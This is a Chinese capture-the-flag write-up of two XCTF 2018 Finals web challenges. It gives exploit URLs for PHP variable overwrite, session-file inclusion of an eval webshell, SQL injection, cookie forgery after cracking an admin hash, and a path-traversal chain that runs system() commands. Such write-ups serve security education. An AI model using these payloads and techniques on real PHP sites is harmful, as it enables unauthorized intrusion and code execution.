# XCTF 2018 Finals Web
## 1.Bestphp
http://10.99.99.16/
![](https://github.com/ReAbout/ctf-writeup/blob/master/xctf-2018-finals/images/2-1.png)
之前一直忙，好不容易找个时间写writeup...在战队大佬的帮助下完成，要好好做做总结。

bestphp是一道PHP代码审计题，通过扫描发现test.php,admin.php和function.php文件,经过验证都没有什么用，尤其是test.php返回可调用的函数，估计真是出题者测试用的，下午的时候就被删除了...
初步漏洞点在call_user_func()和include()。
回调函数，传参数是数组，而且包含参数直接是变量，首先想到就是利用extract变量覆盖。
```
http://10.99.99.16/?function=extract&file=function.php
success!
```
变量覆盖成功后，测试php伪协议构造data文件,没有开启此功能。
```
http://10.99.99.16/?function=extract&file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=
failed!
```
测试php://filter 成功,直接获取function.php源码,并没有什么用，只能算是干扰项。
```
http://10.99.99.16//index.php?function=extract&file=php://filter/read=convert.base64-encode/resource=function.php
success!
```
>function.php:
```
<?php
function filters($data){
	foreach($data as $key=>$value){
		if(preg_match('/eval|assert|exec|passthru|glob|system|popen/i',$value)){
			die('Do not hack me!');
		}
	}
}
?>
```
>admin.php:
```
hello admin
<?php
if(empty($_SESSION['name'])){
	session_start();
	#echo 'hello ' + $_SESSION['name'];
}else{
	die('you must login with admin');
}

?>
```
到这，admin.php作用不大，但是引导我们想到，seesion文件包含这个方向，所以到这矛盾点就到了session文件位置，程序ini_set('open_basedir', '/var/www/html:/tmp');限制了可操作位置。在这耗了很久，查询php文档发现session_start()，[【PHP手册-session_start()】 ](http://php.net/manual/zh/function.session-start.php)PHP7.0.0 新加 options 参数（数组），初始化相关设置，以此来修改session文件存储路径。
```
http://10.99.99.16//index.php?function=session_start&save_path=/tmp
POST DATA:name=<?php echo 'helloworld';@eval(\x24_POST['test']);?>
文件包含
http://10.99.99.16/index.php?function=extract&file=/tmp/sess_l86epsjlkte51fu6gp4dr9eir3
```
构造[EXP脚本](https://github.com/ReAbout/ctf-writeup/blob/master/xctf-2018-finals/files/bestphp_exp.py)

get flag，运行结果如下：
![](https://github.com/ReAbout/ctf-writeup/blob/master/xctf-2018-finals/images/2-2.png)
## 2.PUBG
http://guaika.txmeili.com:8888/
根据题的要求修改host访问，关键是上来服务环境就崩溃，到下午才恢复。
根目录有备份文件www.zip，到这就说明是PHP代码审计了。
```
http://guaika.txmeili.com:8888/www.zip
```
关键源码Zend加密，先解密，但是变量全是随机长字符，很难读懂，在现场找看看有没有转化的，但没有找到，回来发现了[针对ZEND加密混淆的代码修复工具](http://www.zhaoyuanma.com/phpzendfix.html),可以修复变量名。
[源码](https://github.com/ReAbout/ctf-writeup/blob/master/xctf-2018-finals/files/www.zip)
[解密后源码](https://github.com/ReAbout/ctf-writeup/blob/master/xctf-2018-finals/files/wwwde.zip)
### 2.1 SQL injection
在/kss_inc/payapi_return.php 中发现存在SQL注入：
跟踪$num变量，未进行过滤
```
else if ( $_obf_kYyPkY_PkJKVh4qGjJGIio4 == "e138" )
{
    $_obf_kpGPh4mNh46SkZONh4eLlJU = "";
    $_obf_k42NkY2RkoiNjJCKlZSKiIg = trim( $_POST['SerialNo'] );
    $num = $_obf_k42NkY2RkoiNjJCKlZSKiIg;
    $_obf_iIuQkYaUioqGlI6IjIuMiI8 = trim( $_POST['Status'] );
    $_obf_jpGJk5SSkJOIk4iQiI_OhpU = trim( $_POST['Money'] );
    $_obf_iImJjYmQjYyOjIuVkIuMjIs = trim( $_POST['VerifyString'] );
    $_obf_lIuQk5OGjpKVjY6UiI_QjJM = $_obf_jpGJk5SSkJOIk4iQiI_OhpU;
    if ( $_obf_iIuQkYaUioqGlI6IjIuMiI8 == "2" )
    {
        $_obf_i5CMioaGiI6ShomNiIuKjJE = "TRADE_FINISHED";
    }
    else
    {
        $_obf_i5CMioaGiI6ShomNiIuKjJE = "WAIT_BUYER_PAY";
    }
}
else
{
    exit( "errwg" );
}
_obf_iJKHiIeSiJGQkoiPjI6Kk5I( $num, $_obf_i5CMioaGiI6ShomNiIuKjJE, 0 );
$_obf_k42GiI_RiIqKjIaUio6IiIw = "POSTDATA:";
foreach ( $_POST as $_obf_koiIh4mRlJKGlIiGiJCUkI4 => $_obf_lYeSkY6Th5SOlYuHjZGVio8 )
{
    $_obf_k42GiI_RiIqKjIaUio6IiIw .= $_obf_koiIh4mRlJKGlIiGiJCUkI4."=".urlencode( $_obf_lYeSkY6Th5SOlYuHjZGVio8 )."&";
}
_obf_iJKHiIeSiJGQkoiPjI6Kk5I( $num, $_obf_k42GiI_RiIqKjIaUio6IiIw );
$_obf_lYuTjYmGkJWKk5WOjoeGlYw = "GETDATA:";
foreach ( $_GET as $_obf_koiIh4mRlJKGlIiGiJCUkI4 => $_obf_lYeSkY6Th5SOlYuHjZGVio8 )
{
    $_obf_lYuTjYmGkJWKk5WOjoeGlYw .= $_obf_koiIh4mRlJKGlIiGiJCUkI4."=".urlencode( $_obf_lYeSkY6Th5SOlYuHjZGVio8 )."&";
}
_obf_iJKHiIeSiJGQkoiPjI6Kk5I( $num, $_obf_lYuTjYmGkJWKk5WOjoeGlYw );
if ( !in_array( $_obf_i5CMioaGiI6ShomNiIuKjJE, $_obf_k5OQh4iJjoyPjJSMjpSOlZA ) )
{
    _obf_kYyOhouLjo2Gh4eNj4iQlIg( $_obf_jo_MipCRkYuSk4mSko2RkIg[$_obf_kYyPkY_PkJKVh4qGjJGIio4]."返回的状态码异常！" );
}
$_obf_jIaUiIeSjZWKlIqLkIqOioc = new mysql_cls( );
$_obf_jIaUiIeSjZWKlIqLkIqOioc->_obf_jIuSjYuUkJGHlYuPjZOQjY4( $_obf_mGKRY4dMuU6bZZJfh1_TX5k );
$_obf_lZGQj4iOj4mTlZGNjZGUj5E = $_obf_jIaUiIeSjZWKlIqLkIqOioc->_obf_iY6OkJCRkY2PjpCPk5CRkJA( "select * from kss_tb_log_agentrmb where ordernum='".$num."'" );
```
payload:
```
http://guaika.txmeili.com:8888/kss_inc/payapi_return.php
POST DATA: SerialNo=1&Money=100&Status=1&AttachString=138&MerchantKey=1&VerifyString=82cecfbfb3e283d334b935514143c7

```
直接用sqlmap，结果如下：
![](/images/1-1.png)
顺便试下，不能直接load_file getshell，得到用户名密码。
| username | password                         |
| ------ | ------ |
| axing    | 8ccf03839a8c63a3a9de17fa5ac6a192 |  
密码MD5解密为axing147258 
直接登录发现，一直显示密码报错，这时候想到，麦香老师说要注意下cookie，所以就想估计是要构造cookie绕过，又要审计下，cookie的创建和验证。
### 2.2构造cookie绕过验证
>kss_inc/function.php
```
function _obf_jZKVlY6HkYmKkIyRj4qSjIc�( $_obf_iYyTho_HlJCOh4yRj4ePj4k�, $_obf_ipCJlJOSlJSQkYqNlYqKlIs� )
{
    setcookie( $_obf_iYyTho_HlJCOh4yRj4ePj4k�, $_obf_ipCJlJOSlJSQkYqNlYqKlIs�, 0, "/", NULL, NULL, TRUE );
    if ( BINDIP == 1 )
    {
        setcookie( $_obf_iYyTho_HlJCOh4yRj4ePj4k�."_ver", md5( $_obf_ipCJlJOSlJSQkYqNlYqKlIs�.COOKKEY._obf_jZKKjpCGkZSUj4aOiIePlZI�( ) ), 0, "/", NULL, NULL, TRUE );
    }
    else
    {
        setcookie( $_obf_iYyTho_HlJCOh4yRj4ePj4k�."_ver", md5( $_obf_ipCJlJOSlJSQkYqNlYqKlIs�.COOKKEY ), 0, "/", NULL, NULL, TRUE );
    }
    return $_obf_ipCJlJOSlJSQkYqNlYqKlIs�.COOKKEY;
}
```
>kss_admin/index.php
找到manager cookiez字符串构造方法
```
$0_manager_cookie_key = $0_manager['id'].",".$0_username.",".md5( $0_password ).",".$0_linecode;
```
>kss_inc/db_function.php
找到 linecode = efefefef

[cookie生成脚本](https://github.com/ReAbout/ctf-writeup/blob/master/xctf-2018-finals/files/get_cookie.py)

### 2.3 后台Getshell
![](https://github.com/ReAbout/ctf-writeup/blob/master/xctf-2018-finals/images/1-2.png)
成功登陆后台，首先想到的是写配置文件，getshell。最后发现config不可写或者报错，导致config信息写入数据库，一顿在后台测试未成功，大多是数据库操作的都需要安全码验证。
只能继续审计
>kss_admin/admin_update.php
这个网站的更新存在漏洞，是从远端主站获取写入本地:
```
$_obfuscate_koiKkIiPjI6UkYeRlIqNhoc� = _obfuscate_lY6Gk5KMkYmPjIyPhpCOlYc�( "http://api.hphu.com/import/".$_obfuscate_koaSiYqGjIqMiZSLk4uGiZU�.".php?phpver=".PHP_VERSION."&webid=".WEBID."&rid=".time( ), 300 );
```
我们跟入_obfuscate_lY6Gk5KMkYmPjIyPhpCOlYc�函数
位于第20行，函数中有curl相关的操作
```
curl_setopt( $_obfuscate_joiNh4aIhouViZGQho_JiI4�, CURLOPT_HEADERFUNCTION, "read_header" );
curl_setopt( $_obfuscate_joiNh4aIhouViZGQho_JiI4�, CURLOPT_WRITEFUNCTION, "read_body" );
```
看下read_body函数
```
function read_body( $_obfuscate_joiNh4aIhouViZGQho_JiI4�, $_obfuscate_jJWMiJWJjoyIkYmLjY6VipM� )
{
    global $_obfuscate_ko6MhoiQkJKRlYeVio_JjYo�;
    global $_obfuscate_j4eNjZOQlIuKhoqMj4mOjYs�;
    global $_obfuscate_koaSiYqGjIqMiZSLk4uGiZU�;
    if ( $_obfuscate_ko6MhoiQkJKRlYeVio_JjYo� == 0 && substr( $_obfuscate_jJWMiJWJjoyIkYmLjY6VipM�, 0, 2 ) == "<!" )
    {
        $_obfuscate_j4eNjZOQlIuKhoqMj4mOjYs� = 0;
    }
    $_obfuscate_ko6MhoiQkJKRlYeVio_JjYo� += strlen( $_obfuscate_jJWMiJWJjoyIkYmLjY6VipM� );
    file_put_contents( KSSROOTDIR."kss_tool".DIRECTORY_SEPARATOR."_webup.php", $_obfuscate_jJWMiJWJjoyIkYmLjY6VipM�, FILE_APPEND );
    echo "<script>$('#downsize').html('".$_obfuscate_ko6MhoiQkJKRlYeVio_JjYo�."');</script>";
    echo "<!--  ".str_repeat( " ", 2000 )." -->\r\n";
    ob_flush( );
    flush( );
    return strlen( $_obfuscate_jJWMiJWJjoyIkYmLjY6VipM� );
}
```
结合kss_admin/admin_makecache.php文件，利用代码中的sql过滤器，去触发某个页面的sql报错，从而将php代码回显。
EXP:
```
http://guaika.txmeili.com:8888/kss_admin/admin_update.php?pakname=../test/kss_admin/admin_makecache.php%3Faction=123%27%3C%3Fphp%2520system(%22dir%2520%22);%3F%3E
http://guaika.txmeili.com:8888/kss_admin/admin_update.php?pakname=../test/kss_admin/admin_makecache.php%3Faction=123%27%3C%3Fphp%2520system(%22type%2520C:\\dsaodjasovdsjgsmaohsormsdmsama.txt%22);%3F%3E
```
get flag
![](https://github.com/ReAbout/ctf-writeup/blob/master/xctf-2018-finals/images/1-3.png)

